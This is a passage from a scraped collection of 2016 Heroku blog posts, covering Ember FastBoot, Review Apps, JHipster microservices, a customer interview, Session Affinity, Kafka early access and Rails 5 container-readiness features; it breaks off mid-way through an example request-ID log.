I think we're in 2.5 now, and we do six-week release cycles, so in probably about 12 weeks roughly. I was not expecting such a concrete date [laughs] And the thing is that we've been working on it for the last year, and it ended up being a much harder problem than I thought, but I think we're very close, we've cracked a lot of very important nuts. The most important thing to think about when you're trying to migrate to FastBoot and adopt it is that you really have to realize is that you're now writing an application that's no longer running in just the browser. You're writing an application that has to run in Node as well, and so you have to use the unified subset between those two. There's a Node environment and a browser environment and they don't have the same things. The DOM, for example. The DOM is the big one, right. And actually, it ends up being OK. That sounds like it may be a fatal restriction, but in practice, Ember apps are very well-structured, and most things are within specific lifecycle hooks. On a component for example, if you write a component, a lot of the behavior you have that relies on the DOM existing is inside this hook called didInsertElement . And so what we do in FastBoot, we just don't call it. We render your app; we render your templates, and if there's anything you do when you touch the DOM, we just don't do it. It forces you into some best practices too. I would say that. It definitely requires you to clean up your app. And because FastBoot apps run concurrently, you have to make sure you don't have any shared global state. And so that might be a problem if you have a messy app, but in general, it helps you justify putting in a bit of effort to clean it up. We've almost convinced the rest of the world that that's important on the server too. We're getting there very slowly at Heroku. Do you think that this duality is going to hurt adoption? A lot of times when you're shipping stuff to production, you take a lot of shortcuts, so more often than not a lot of these things are in many Ember apps today. I've migrated a few really large apps, and in practice, it's maybe a couple of weeks of work for big apps that have been around for a few years. There's no question about that. I think the benefits are worth it. But the other thing I'll say about that is - Node, when it started, was just some people taking V8 and binding it to their environment that they created to bind into Unix system calls. V8 plus Unix. But what you're seeing happening is that people are starting to take Node on the server a lot more seriously, and more importantly, the process of developing JavaScript as a language is becoming more open, and there's far more contributors to it now. It used to be mostly browser vendors, but now you have practitioners, people from Node who are on TC39. I think what you're going to start seeing, because there's so much interest in running the same code on the browser and the server, is that those environments are going to become a lot more unified than before. So a lot of the gotchas that might exist today as Node evolves and JavaScript evolves, and the browser evolves, I think that the difference between those environments is slowly going to converge. To listen to the rest of their conversation, download the whole interview here , and jump to the 14:30 mark. ember javascript node v8 fastboot", "date": "2016-04-05,"},
{"website": "Heroku", "title": "Heroku Review Apps now Generally Available", "author": ["Ike DeLorenzo"], "link": "https://blog.heroku.com/heroku-review-apps-ga", "abstract": "Heroku Review Apps now Generally Available Posted by Ike DeLorenzo April 18, 2016 Listen to this article Today, we are happy to announce the graduation of Heroku Review apps from an exceptionally popular beta to being generally available to all Heroku users. Review apps are the instant, disposable Heroku app environments that can spin up automatically with each GitHub pull request.  They allow developers and their teams to automatically build and test any pull request, updated at every push, at a temporary, shareable URL. When the pull request is closed or merged, the Review app is deleted.  GitHub users are notified of all this, right in the pull request web interface. Instead of speculating on how the code in a pull request might run, you can actually see the code running in a live environment. Now your team can focus on perfecting the user experience as well as finding and fixing bugs much earlier in the development process, leading to more frequent and higher quality releases. As GitHub puts it: \"Heroku Review apps bring GitHub pull requests to life.\" And we are happy that Review Apps are one of our most popular new features. Thousands of developers have participated in the beta, and the feedback has been helpful and gratifying - thanks to everyone that was part of the program. Realistic test environments, on demand. To make testing accurate, these Review app environments can inherit the configurations of your Heroku staging and production apps, including add-ons and dyno formations.  You can even write post-deploy scripts to populate data stores, ensuring that your Review Apps have meaningful data.. That way, you can be certain you're testing against the same situations your code will face after you merge into staging for integration testing, and then promote on to production. Getting the team involved Designers, Product Managers, and other internal stakeholders can now participate in the discussion around a pull request because they can actually run the new fix or feature in a browser — just by visiting the Review app URL.  Runnable, testable Review apps can make a GitHub account meaningful for everyone on the broader product-development team, where they can join in the pull request comments. And Slack, HipChat, and e-mail discussions are more productive with an objective experience to discuss (and URL to include). If you choose, Review app URLs can even be shared with outside clients, so they can vet and approve designs and features before the pull request is merged. Review apps and Heroku Flow Review apps are core to Heroku Flow , our prescriptive, flexible Continuous Delivery solution for teams of all sizes.  When you connect your Development or Staging app to a GitHub repo, Review apps and GitHub deployment are automatically readied for your Heroku Pipeline.  The flow of code is visualized and managed on each Pipeline's overview page. At each stage leading to Production, you can select the appropriate automatic or manual deployments: Review apps can spin up for each pull request, and GitHub can trigger deployments to staging for each merge and push to the branch of your choice (typically master).  Then you can \"promote\" your built code from, say, Staging to Production — all in the same visual interface, with deploy access governed by Heroku Permissions It's a simple and powerful way to add (and actually enjoy) continuous delivery without radical changes to your GitHub workflow.  The real-time Pipelines overview page in the Heroku Dashboard presents or removes Review app details as each pull request becomes active or inactive, manages builds and code promotion, and provides set-up and options for all features of Heroku Flow. Secure deployments, Support for Heroku Private Spaces Teams that want to restrict deployments to certain developers or build managers, can restrict deploy permissions on production or staging apps for compliance or security reasons without restricting the ability of developers to create, use, and share Review apps. Companies using Pipelines in Heroku Private Spaces can choose to have Review apps spin up in the Heroku Common Runtime (for cost savings and wide testability) or in the Private Space of the parent app (for enhanced security and compliance). Getting Started with Review apps To get started with Review apps , just login to Heroku, create a Pipeline from your main dashboard, and connect your Pipeline to the GitHub repo that manages your team's project code, with deployment to an app in Staging.  In the \"Review Apps\" column of the Pipeline, you can then enable and configure your Review apps in a couple clicks.", "date": "2016-04-18,"},
{"website": "Heroku", "title": "Bootstrapping Your Microservices Architecture with JHipster and Spring", "author": ["Julien Dubois"], "link": "https://blog.heroku.com/bootstrapping_your_microservices_architecture_with_jhipster_and_spring", "abstract": "Bootstrapping Your Microservices Architecture with JHipster and Spring Posted by Julien Dubois April 21, 2016 Listen to this article Julien Dubois is the lead developer of JHipster, a Yeoman generator for Spring and AngularJS applications. Julien’s here to show how you can use a generator like JHipster to address some of the design concerns microservices introduce like discovery and routing so you can focus on your core business logic. What is JHipster? JHipster (for Java Hipster) is an Open Source application generator, based on Yeoman. It generates a Spring Boot (that's the Java part) and AngularJS (that's the hipster part) application, with tooling and configuration all set up for you. In this post, you’ll learn how you can use JHipster to generate a microservices stack to address design concerns like service registration, configuration and client side routing. Developers use JHipster to get their project started very quickly, with a full-stack application ready to run in production within a few minutes. The generated application is full of best practices, tips and tooling: for example it includes BrowserSync (for client-side “live reload” of your application), Spring Boot Devtools (for “hot reload” of your Java code) and Liquibase (for automatic migration of your database schema). Used together consistently, those 3 tools make your development workflow much more efficient than what Java developers traditionally experience. With more than 200 contributors and 200,000 downloads, JHipster is currently the most popular Java application generator, and it has reached its 3.0 version last month, focusing on microservices using the Spring Cloud Netflix stack. JHipster microservice architecture overview JHipster can generate classical, “monolithic” applications, and then deploy them easily on Heroku. In fact, the JHipster Heroku sub-generator is maintained by Joe Kutner (from Heroku), and is currently the most popular option for deploying JHipster applications on the cloud. Since JHipster 3.0, the generator can also provide a full microservice architecture, based on the Spring Cloud Netflix stack. This architecture is a decoupling of the original “monolithic” application into three components: The JHipster Registry, which acts as a central service registry and configuration hub for the whole architecture Microservices applications, which are small Spring Boot applications with no user interface Gateway applications, which handle the front-end AngularJS code, and act as routers and load-balancers in front of the microservices applications. A detailed explanation of all those components can be found on the JHipster microservices documentation . Launching the JHipster Registry JHipster uses the \"JHipster Registry\" to manage microservices and gateways. It is in fact two components working together: A Spring Cloud Netflix Eureka server used to discover all services instances A Spring Cloud Config server, so all nodes can be automatically configured from a central location This JHipster Registry is a fully Open Source, Apache 2-licensed software, that you can easily install yourself. The great news with Heroku is that we have already configured it for you, and you just need to click on the button below to start your own JHipster Registry: This will start a basic JHipster Registry, which is enough to get started and develop microservices with JHipster. You can find more information about it on the JHipster Heroku documentation . If you haven’t done it yet, click on that button, and add a JHipster Registry to your Heroku applications. Now you can create a microservice that connects itself with the Registry. Building a microservice with JHipster With JHipster installed , run the following command to start a new project yo jhipster The generator will prompt you with a number of questions that determine how your application will be built. For the first question, the application type, choose a \"microservice application\".\nFor the remaining questions, consider the following suggestions: Our main recommendation is to use a PostgreSQL database, as it comes bundled with Heroku. You can choose to use a Hibernate 2nd-level cache, but be warned this cache will not work in a distributed mode with Heroku, as the required network ports will not be opened. In the future, JHipster should support Memcached, which would be a better solution for Heroku. If you want to use non-default configurations or services, please verify they work correctly with Heroku. For example, if you select Elasticsearch, you need to have this service available in your Heroku space. Once you have created your application, you can create a simple \"Demo\" entity by typing: yo jhipster:entity Demo You can give your entity a few default fields, as well as some validation rules. Those fields and rules will be applied on your AngularJS code, on your Java code (using Bean Validation for the validation rules), and on your database schema. If you want to make complex entities, and use relationships between your entities, we highly recommend you try out JHipster’s online JDL Studio tool, that will help you create your entities graphically. Once you have finished, use Maven to test your application. As JHipster has configured a Maven wrapper at the root of your project, this is just a matter of running: ./mvnw test Instead of running the service locally first, we’ll deploy it on Heroku. Deploying the microservice The generated microservice has a Spring Boot configuration that should be already tuned for Heroku. This configuration could be automatically applied from the JHipster Registry: as the registry is also a Spring Cloud Config server, it can push configuration properties to all registered service. Using the JHipster Registry is normally the preferred option for JHipster, but as we discussed earlier we have a basic setup, which is not secured, so we are not going to use it. Open up your microservice application with your favorite IDE, and modify the following file: src/main/resources/config/application-prod.yml Edit the eureka.instance properties, so it points to your microservice application name, and doesn’t use the application’s IP address (as they are not available outside of Heroku): eureka:\n    instance:\n        hostname: my-jhipster-demo.herokuapp.com\n        non-secure-port: 80\n        prefer-ip-address: false The microservice hostname is the name on which your application will be deployed on Heroku. Now your microservice is ready to connect to the JHipster Registry, once it will be deployed on Heroku. At the root of the microservice project, run: yo jhipster:heroku This command will ask a few basic questions, in order to configure and deploy the microservice on Heroku. One question will ask for the location of the JHipster Registry. For this, provide the URL of your Registry in the form http://my-jhipster-registry.herokuapp.com/ (again replacing my-jhipster-registry with your Registry app name). Once your application is deployed, go to your JHipster Registry in order to see that your microservice has been registered. For example, it should be listed in the registered services in http://my-jhipster-registry.herokuapp.com/ . Building a gateway Once the microservice is up and running, we need to build a gateway to access it. To generate the gateway, create a new project and run again: yo jhipster Now you need to select \"microservice gateway\" as application type, and once again use a PostgreSQL database, with no Hibernate 2nd level cache, as it will be easier to deploy on Heroku. Once this \"gateway\" is generated, you need to add an AngularJS-based graphical user interface, to access our previous \"Demo\" entity from the microservice. In your gateway application, please run: yo jhipster:entity Demo As you are running this command in a gateway, JHipster will ask a new question: \"Do you want to generate this entity from an existing microservice?\". Answer \"yes\" to that question, and then point to your microservice project, so that the generator can generate a front-end code on the gateway, based on the microservice back-end. You can now run ./mvnw test to test your Java application, and gulp test to test your JavaScript front-end. Deploying the gateway Exactly like we did for the microservice, we need to configure the gateway so that it uses the JHipster Registry. Re-configure the bootstrap-prod.yml and application-prod.yml files like you did for the microservice. Don’t forget that eureka.instance.hostname must point to your application’s host name. Again, at the root of the gateway project, run: yo jhipster:heroku Then run this command to set the gateway's heap size and stack size: heroku config:set JAVA_TOOL_OPTIONS=\"-Xmx256m -Xss512k\" This will allow more room for off-heap memory and metaspace. Once the gateway is started, this gateway should also get automatically registered in the JHipster Registry. Testing the whole microservice infrastructure Everything is now deployed! You can check that each application launched correctly by using heroku logs --tail in each application. Connecting to the JHipster Registry, you should be able to see the demo application and the gateway application registered. For example, you could go to http://my-jhipster-registry.herokuapp.com/ to have access to the registry’s admin dashboard. Access the gateway, for example at http://my-jhipster-gateway.herokuapp.com/ to see the whole architecture in action: Use the default JHipster admin account, with the default admin password In the Administration > Gateway menu, you should have access to a dashboard showing that the demo microservice is up. This information comes from the JHipster Registry, which is used by the gateway to automatically open up a route to that service. Now go to the Entities > Demo menu, in order to use the “Demo” entity, which is managed in the back-end by the microservice. You can add, update, delete and list entities from the gateway UI. Going further The JHipster Registry we have used here is just a basic setup: in production, it must be secured, mainly because it can contain your applications’ properties. This would allow you to have a much easier and much more secure setup. As your application grows, this architecture will allow you to create new microservices, and maybe also more gateways (it is common to have specific gateways for different use cases). The JHipster and Heroku combo makes it very quick and easy to generate a new service, host it, and make it available on a gateway. Once you have everything up and running, if you have any improvements to make to this setup, don’t hesitate to participate in the JHipster project. It is hosted on GitHub , and the community is always happy to have new members joining the team! Dive in and get more information about building Spring Boot applications on Heroku. Learn more about the support for Java and other JVM languages on Heroku.", "date": "2016-04-21,"},
{"website": "Heroku", "title": "Cyber Monday, No Sweat: Why Sweet Tooth Chose PaaS", "author": ["Matthew Creager"], "link": "https://blog.heroku.com/sweet_tooth_s_journey_from_aws_to_heroku_an_interview_with_bill_curtis_co_founder_cto", "abstract": "Cyber Monday, No Sweat: Why Sweet Tooth Chose PaaS Posted by Matthew Creager April 07, 2016 Listen to this article We recently sat down for a chat with Bill Curtis , a co-founder and the CTO of Sweet Tooth , a points and rewards app for online stores worldwide. What has been your greatest challenge? We’re serving way more data today than we ever have, so scaling is mission-critical. In the past, we’ve struggled with traffic spikes. For example, there are seasonal spikes, like Black Friday or Cyber Monday. There are also spikes from merchant activity, such as load testing stores or importing a large number of orders. I recently tweeted our requests-per-hour graph. It showed that during the huge spikes for this year’s Black Friday and Cyber Monday, our product availability was seamless on Heroku. That would not have been the case on our old infrastructure. We've been serving 150k requests / hour since 11am this cyber monday. @heroku dynos ain't even sweating 💪💪💪 pic.twitter.com/rvhYQESqWm — Bill Curtis (@billcurtis_) November 30, 2015 How do you manage those high traffic days? We use Librato, which is a really nice minute-by-minute analytics/metrics system, to monitor the load on our servers. We also have alerts connected to our Slack channel. This will get hit if there are certain fluctuations, such as too many errors in a certain time period or an increase in our queues. With Heroku, all we need to do is go in and crank up some dynos so there are no bottlenecks. Walk us through your stack We’re running Rails on the server, which powers our API. There’s no view level logic in our Rails app; it’s just serving JSON through REST API endpoints. We have a front-end app written in Ember.js that serves static content and allows merchants to manage their points program. Then the app boots and hits the API to grab the merchant and customers data. Heroku Postgres is our database, which has been a hugely positive change for us. We moved from MySQL to Heroku Postgres, and the difference has been night and day. It would be worth switching to Heroku just for their Postgres offering! It’s awesome. Postgres is a much more modern database with better data types than we had before. We especially love its automatic backups. Although we haven’t used its forking and following features that much yet, as soon as we scale to multiple testing environments, it will be super useful. We also have about 15 or so different background workers that are crunching data every day and running stuff in the background. Heroku makes it super easy to get those set up and know which ones are running. Why Ruby? We used to be a PHP shop through and through. We switched to Rails two years ago, and a few members on the team had some experience with it. For us, Rails felt like a much more mature platform. It provided a very nice package to build an API that serves multiple clients. Does your stack include any other Heroku Add-Ons beside Librato and Heroku Postgres? We’ve integrated lots of Heroku Add-ons, including Deploy Hooks , Rollbar , Heroku Redis , and SSL encryption. Rollbar’s error tracking is great—in one click you can have it running in a new environment. It also lets you create multiple accounts for each of your apps, which makes managing passwords simple. We use Heroku Redis for caching and queuing. Sidekiq uses Redis for memory queuing storage, which is how we calculate metrics for our merchants or how we process different events or points in the background. I’ve used the other Redis add-ons, but I trust the Heroku team and brand, and if they put their resources behind a specific product, then I’m going to chose that one. What does your continuous delivery pipeline look like on Heroku? With Heroku, our staging and production are in high parity. It’s something we missed in our prior infrastructure solutions. Staging environments are expensive to run. Heroku allows us to have almost the same environment but scaled down. It gives us confidence that we can catch any bugs or differences before they go out to production. Why did you move from infrastructure and operations as a service to PaaS? We had experience creating software that deployed on other systems, so we never had to do any operations stuff. We never had to manage servers except for our website. All of a sudden we found ourselves with a SaaS company, so naturally operations became a much bigger deal. We first turned to AWS and their suite of products, only to realize that it’s a very raw infrastructure, and you have to know what you’re doing to make that work. Then, we hired an operations-as-a-service company to manage our infrastructure. As we became more mature as a company, we started deploying more often and realized that our operations needs had changed. Our team needed more visibility into how our apps were running and more fine-tuned control, which wasn’t possible through the external company. It got to the point where we had a wish list of about ten things we wanted built into our operations, and adding them up together would put us in a much better place. Heroku offered us the ease and control we were looking for to take our product to the next level.\nWe liked how Heroku empowers developers to manage and scale apps without needing to know every sort of server configuration. With all the Heroku Add-ons, in one click we could have an error reporting or logging system, deploy web hooks, integrate with GitHub, or tail logs from the command line. It also scales very affordably. Heroku made total sense for Sweet Tooth. Any final thoughts? Ultimately, Heroku has helped us better grow the product and focus on our purpose at Sweet Tooth, which is to help merchants. The more we can do that, and not focus on technical overhead, the happier we can make our customers. Thank’s for your time, Bill! Thank you! Read our Sweet Tooth Customer Story to learn more about Sweet Tooth’s business. High Tech Retail U.S. Company size: XS Customer Data E-Commerce Loyalty postgres redis ruby Startup", "date": "2016-04-07,"},
{"website": "Heroku", "title": "Session Affinity now Generally Available", "author": ["Hunter Loftis"], "link": "https://blog.heroku.com/session-affinity-ga", "abstract": "Session Affinity now Generally Available Posted by Hunter Loftis April 25, 2016 Listen to this article Today we are announcing that Session Affinity routing is now generally available as a fully supported part of the Heroku Platform. When Session Affinity is enabled for an app, requests from a given browser will always be routed to the same Dyno.  Under the hood, the Heroku Router will add a cookie to all incoming requests from new clients; this cookie allows subsequent requests from that client to return to the same Dyno. With specific clients bound to specific Dynos, apps that depend on ‘sticky sessions’ can still take advantage of Heroku’s flexible scaling. We introduced Session Affinity in Heroku Labs last April. Since then, many customers have built apps with the new routing strategy and feedback has been overwhelmingly positive. It’s now battle-tested and stable, so that you can use it confidently in any of your Heroku apps. When Should You Use Session Affinity? Normally, Heroku Routers use a random selection algorithm for balancing requests across web dynos. Distributing requests to different Dynos allows all the servers in your app to balance the load, and is generally a good default. However, stateful servers may need a different routing strategy. If you prefer not to keep state in Redis, a database, S3, or other storage, sticky sessions may be your solution. This has been a frequent request from Tomcat, Lift, and Express-Session users. Similarly, real-time systems like Socket.io, SockJS, and Meteor require local state to emulate a persistent WebSocket connection. With Session Affinity enabled, each request from a particular client will be handled by the same Dyno. When new Dynos are created or old Dynos are removed, attached clients will be provided with an updated cookie that points at an available Dyno. This allows real-time apps and apps with in-memory state to scale as usual on Heroku. Keep in mind that Session Affinity is only one part of the persistence equation. For instance, with Socket.io, using multiple nodes requires session affinity, Node-Cluster routing, and an intra-node messaging adapter. Getting Started with Session Affinity You can enable Session Affinity on an app by running heroku features:enable http-session-affinity -a {appname} . Session Affinity is available for applications using the Common Runtime and is not currently available in Private Spaces . To learn more, check out the docs . session affinity sticky sessions routing websocket socket.io", "date": "2016-04-25,"},
{"website": "Heroku", "title": "Announcing Heroku Kafka Early Access", "author": ["Rand Fitzpatrick"], "link": "https://blog.heroku.com/announcing-heroku-kafka-early-access", "abstract": "Announcing Heroku Kafka Early Access Posted by Rand Fitzpatrick April 26, 2016 Listen to this article Today we are happy to announce early access to Heroku Kafka . We think Kafka is interesting and exciting because it provides a powerful and scalable set of primitives for reasoning about, building, and scaling systems that can handle high volumes and velocities of data. Heroku Kafka makes Kafka more accessible, reliable, and easy to integrate into your applications. What is Kafka? Apache Kafka is a distributed commit log for fast, fault-tolerant communication between producers and consumers using message based topics. Kafka provides the messaging backbone for building a new generation of distributed applications capable of handling billions of events and millions of transactions. At Heroku we use Kafka to create more robust stream processing systems for our operational metrics, and to bring change data capture semantics to the event bus behind our API. It has been an amazingly powerful tool for the customers we’ve worked with over the course of our private beta, enabling them to synchronize data across systems, manage high-volume inbound event streams, build simplified service oriented architectures, and more. Kafka the Heroku Way Heroku has years of experience creating data services as products.  We have already productized great open source projects like Postgres and Redis, offering them to all developers as Heroku services with powerful features and a unique developer experience.  With Heroku Kafka, we extend this capability to a new type of particularly complex data service: distributed systems. Extending the Heroku developer experience to Kafka also means creating carefully crafted CLI and Web tools that make it easy to configure and manage Kafka alongside your Heroku applications. These tools provide you the metrics, logging and insights you need to tune your integration, making it easier to focus on the logic of your products, and to scale with ease. Kafka producers and consumers can also be developed, deployed, monitored, and scaled as Heroku applications, providing a fully integrated development experience. This initial release represents the first step, and we look forward to adding new functionality as we rollout Heroku Kafka fully in the coming months. Get Early Access Heroku Kafka is in early access; you can get on the list to participate in the beta today and we’ll be inviting developers on a rolling basis. We can’t wait to see what you build with a new ecosystem of Heroku data services to power your applications. kafka data beta", "date": "2016-04-26,"},
{"website": "Heroku", "title": "Container-Ready Rails 5", "author": ["Richard Schneeman"], "link": "https://blog.heroku.com/container_ready_rails_5", "abstract": "Container-Ready Rails 5 Posted by Richard Schneeman May 02, 2016 Listen to this article Rails 5 will be the easiest release ever to get running on Heroku. You can get it going in just five lines: $ rails new myapp -d postgresql\n$ cd myapp\n$ git init . ; git add . ; git commit -m first\n$ heroku create\n$ git push heroku master These five lines (and a view or two) are all you need to get a Rails 5 app working on Heroku — there are no special gems you need to install, or flags you must toggle. Let's take a peek under the hood, and explore the interfaces baked right into Rails 5 that make it easy to deploy your app on any modern container-based platform. Production Web Server as the Default Before Rails 5, the default web server that you get when you run $ rails server is WEBrick , which is the only server that ships with the Ruby standard library. For years now Heroku has recommended against using WEBrick as a production webserver mostly due to performance concerns, since by default WEBrick cannot handle more than one request at a time. With the addition of ActionCable to Rails 5, the Rails team needed a web server that could handle concurrent requests, so they decided to make Puma webserver the new default. Now, when you deploy a Rails 5 app without a Procfile in your project and Heroku boots your application using $ rails server , you'll get a performant, production-ready web server by default . Note : if you're upgrading an existing Rails app, you'll want to manually add Puma to your app . In addition to shipping with Puma, Rails also generates config/puma.rb and efforts were made to allow Puma to read this config file when it's booted by the $ rails server command. This feature is baked into Puma 3.x+, which allows Rails to configure Puma around the number of threads being generated. Active Record will generate a pool of five connections by default. These connections are checked out from the pool for the entire duration of the request, so it's critical that for each concurrent request your webserver can handle, you need that many connections in your connection pool. By default, the Puma server starts with up to 16 threads. This means that it can be processing up to 16 different requests at the same time, but since Active Record is limited to five connections, only five of those requests will have access to the database at a time. This means eventually you'll hit this error: ActiveRecord::ConnectionTimeoutError - could not obtain a database connection within 5 seconds. The max pool size is currently 5; consider increasing it The solution was to tell Puma that we only want five threads by default. We also wanted a way to re-configure that count without having to commit a change to git, and redeploy for it to take effect. So by default Rails specifies the same number of threads in Puma as Active Record has in its connection pool: # config/puma.rb\n\n# Puma can serve each request in a thread from an internal thread pool.\n# The `threads` method takes a minimum and maximum.\n# Any libraries that use thread pools should be configured to match\n# the maximum value specified for Puma. Default is set to 5 threads for minimum\n# and maximum, this matches the default thread size of Active Record.\n\nthreads_count = ENV.fetch(\"RAILS_MAX_THREADS\") { 5 }.to_i\nthreads threads_count, threads_count Note: For a production service there is little benefit to setting a minimum thread value . Now when you deploy, your Puma thread count will match your Active Record thread count so you won't get timeout errors. Later the default for Active Record was adjusted to take advantage of the RAILS_MAX_THREADS environment variable. When you scale your Puma thread count via that environment variable, the Active Record connection pool automatically does the right thing. Port On Heroku, we recommend you specify how to run your app via the Procfile — if you don't specify a Procfile we will set a default process type for you. Since Heroku apps run inside containers, they need to know which port to connect to, so we set the $PORT environment variable. The buildpack will specify a web process command if you don't provide one. For example, if you're deploying a Rails 2 app without a Procfile , by default your app would run: $ bundle exec ruby script/server -p $PORT In Rails 5 you can now use the $PORT environment variable to specify what port you want your app to connect to . This change doesn't really affect how your app runs on Heroku, but if you're trying to run inside of a logic-less build system it can help make it easier to get your application to connect to the right place. Serving Files by Default Prior to Rails 4.2, a Rails app would not serve its own assets. It was assumed that you would always deploy behind some other kind of server such as NGINX that would serve your static files for you. This is still the default behavior, however, new apps can have the static file service turned on via an environment variable . # config/environments/production.rb\n\nconfig.public_file_server.enabled = ENV['RAILS_SERVE_STATIC_FILES'].present? Heroku will set this value when you deploy a Ruby app via the Heroku Ruby Buildpack for Rails 4.2+ apps. Previously you would have to either set this value manually or use the rails_12_factor gem. STDOUT Logging The default logging location in Rails has always been to a file with the name of your environment so production logs go to logs/production.log . This works well for a traditional deployment but when deploying to a container-based architecture, it makes retrieving and aggregating logs very difficult. Instead, Heroku has advocated for logging to STDOUT instead and treating your logs as streams. These streams can then be directly consumed, fed into a logging add-on for archival, or even used for structured data aggregation. The default hasn't changed, but starting in Rails 5, new apps can log to STDOUT via an environment variable if ENV[\"RAILS_LOG_TO_STDOUT\"].present?\n  logger           = ActiveSupport::Logger.new(STDOUT)\n  logger.formatter = config.log_formatter\n  config.logger = ActiveSupport::TaggedLogging.new(logger)\nend This value can be set by the container or the platform on which your Rails app runs. In our case, the Ruby buildpack detects your Rails version, and if it's Rails 5 or greater will set the RAILS_LOG_TO_STDOUT environment variable. DATABASE_URL Support for connection to the database specified in $DATABASE_URL has been around since Rails 3.2, however, there were a large number of bugs and edge cases that weren't completely handled until Rails 4.1 . Prior to Rails 4.1, because the DATABASE_URL integration was not 100% of the way there, Heroku used to write over your config/database.yml with a file that parsed the environment variable and returned it back as in YAML format. You can see the contents of the \"magic\" database.yml file here . The biggest problem is that this magic file replacement wasn't expected. People would add config keys for things like pool which specifies your Active Record connection pool, and it would be silently ignored. So they had to resort to hacks like this code to modify the database configuration # Hack, do not use with Rails 4.1+\n\nRails.application.config.after_initialize do\n  ActiveRecord::Base.connection_pool.disconnect!\n\n  ActiveSupport.on_load(:active_record) do\n    config = ActiveRecord::Base.configurations[Rails.env] ||\n                Rails.application.config.database_configuration[Rails.env]\n    config['pool']              = ENV['DB_POOL']      || ENV['MAX_THREADS'] || 5\n    ActiveRecord::Base.establish_connection(config)\n  end\nend Even then, you need to make sure that code gets run correctly in all different ways your app can be booted. For example, if you're preloading your app to take advantage of Copy on Write, you'll need to make sure this code runs in an \"after fork\" block. While it works around the issue, it normally meant that configuration was spread around an application in many places, and often resulted in different behaviors for different types of dynos. After the 4.1 patch, Rails merged configuration from the config/database.yml and the $DATABASE_URL environment variable. Heroku no longer needed to over-write your checked-in file, so you can now set pool size directly in your database.yml file. You can see the database connection behavior in Rails 4.1 and beyond explained here . This allows anyone who does not need to configure a database via an environment variable to run exactly as before, but now anyone connecting using the environment variable can keep additional Active Record config in one canonical location. SECRET_KEY_BASE At around the time that Rails 4.1 introduced $DATABASE_URL support, Rails was introducing the secret token store as a new feature. Prior to this feature, there was one secure string that was used to prevent Cross-site request forgery (CSRF) . Lots of developers forgot that it was in their source, and they would check that into their git repository. It's never a good idea to store secrets in source control, and quite a few applications that were public on GitHub were vulnerable as a result. Now with the introduction of the secret key store, we can set this secret token value with an environment variable. # Do not keep production secrets in the repository,\n# instead read values from the environment.\nproduction:\n  secret_key_base: <%= ENV[\"SECRET_KEY_BASE\"] %> Now we do not need to check secure things directly into our application code. With new Rails 4.1+ apps you are required to provide a secret via the SECRET_KEY_BASE environment variable, or to set the value some other way. When deploying a Rails 4.1+ app, Heroku will specify a SECRET_KEY_BASE on your app by default. It is a good idea to rotate this value periodically. You can see the current value by running $ heroku run bash\nRunning bash on issuetriage... up, run.8903\n~ $ echo $SECRET_KEY_BASE\nabcd12345thisIsAMadeUpSecretKeyBaseforThisArticle To set a new key you can use $ heroku config:set SECRET_KEY_BASE=<yournewconfigkeyhere> Note: That this may mean that people who are submitting a form in the time between the key change will have an invalid request as the CSRF token will have changed. Safer Database Actions One of the scariest things you can say to a co-worker is \"I dropped the production database\". While it doesn't happen often, it's a serious enough case to warrant an extra layer of protection. In Rails 5, the database is now aware of the environment that it is run in and by default destructive actions will be prevented on production database . This means if you are connected to your \"production\" database and try to run $ rake db:drop Or other destructive actions that might delete data from your database you'll get an error. You are attempting to run a destructive action against your 'production' database\nif you are sure you want to continue, run the same command with the environment variable\nDISABLE_DATABASE_ENVIRONMENT_CHECK=1 While not required to run on Heroku, it's new in Rails 5, and might save you from a minor catastrophe one day. If you're running on a high enough Postgres plan tier , you'll also have the ability to rollback a database to a specific point in time if anything goes wrong . This is currently available for different durations for all plans Standard and above. Request IDs Running a Rails app with high traffic can be demanding, especially when you can't even tell which of your log lines go together with a single Request. For example three requests could look something like this in your logs: Started GET \"/\" for 72.48.77.213 at 2016-01-06 20:30:21 +0000\n  Rendered welcome/index.html.erb within layouts/application (0.1ms)\nStarted GET \"/\" for 72.48.77.213 at 2016-01-06 20:30:22 +0000\nStarted GET \"/\" for 72.48.77.213 at 2016-01-06 20:30:23 +0000\n  Rendered welcome/index.html.erb within layouts/application (0.1ms)\nProcessing by WelcomeController#index as HTML\nCompleted 200 OK in 5ms (Views: 3.8ms | ActiveRecord: 0.0ms)\nProcessing by WelcomeController#index as HTML\n  Rendered welcome/index.html.erb within layouts/application (0.1ms)\nCompleted 200 OK in 5ms (Views: 3.8ms | ActiveRecord: 0.0ms)\n  Processing by WelcomeController#index as HTML\nCompleted 200 OK in 5ms (Views: 3.8ms | ActiveRecord: 0.0ms) With Rails 5, the request ID will be logged by default, ensuring each request is tagged with a unique identifier. While they are still interleaved it is possible to figure out which lines belong to which requests. Like: [c6034478-4026-4ded-9e3c-088c76d056f1] Started GET \"/\" for 72.48.77.213 at 2016-01-06 20:30:21 +0000\n[c6034478-4026-4ded-9e3c-088c76d056f1]  Rendered welcome/index.html.erb within layouts/application (0.1ms)\n[abuqw781-5026-6ded-7e2v-788c7md0L6fQ] Started GET \"/\" for 72.48.77.213 at 2016-01-06 20:30:22 +0000\n[acfab2a7-f1b7-4e15-8bf6-cdaa008d102c] Started GET \"/\" for 72.48.77.213 at 2016-01-06 20:30:23 +0000\n[abuqw781-5026-6ded-7e2v-788c7md0L6fQ]  Rendered welcome/index.html.erb within layouts/application (0.1ms)\n[c6034478-4026-4ded-9e3c-088c76d056f1] Processing by WelcomeController#index as HTML\n[c6034478-4026-4ded-9e3c-088c76d056f1] Completed 200 OK in 5ms (Views: 3.8ms | ActiveRecord: 0.0ms)\n[abuqw781-5026-6ded-7e2v-788c7md0L6fQ] Processing by WelcomeController#index as HTML\n[abuqw781-5026-6ded-7e2v-788c7md0L6fQ]  Rendered welcome/index.html.erb within layouts/application (0.1ms)\n[abuqw781-5026-6ded-7e2v-788c7md0L6fQ] Completed 200 OK in 5ms (Views: 3.8ms | ActiveRecord: 0.0ms)\n[acfab2a7-f1b7-4e15-8bf6-cdaa008d102c]  Processing by WelcomeController#index as HTML\n[acfab2a7-f1b7-4e15-8bf6-cdaa008d102c] Completed 200 OK in 5ms (Views: 3.8ms | ActiveRecord: 0.0ms) Now, if you have the logs and you find this unique ID, you can filter to only look at information from that request. So a filtered log output would be very clear: [c6034478-4026-4ded-9e3c-088c76d056f1] Started GET \"/\" for 72.48.77.213 at 2016-01-06 20:30:21 +0000\n[c6034478-4026-4ded-9e3c-088c76d056f1]  Rendered welcome/index.html.erb within layouts/application (0.1ms)\n[c6034478-4026-4ded-9e3c-088c76d056f1] Processing by WelcomeController#index as 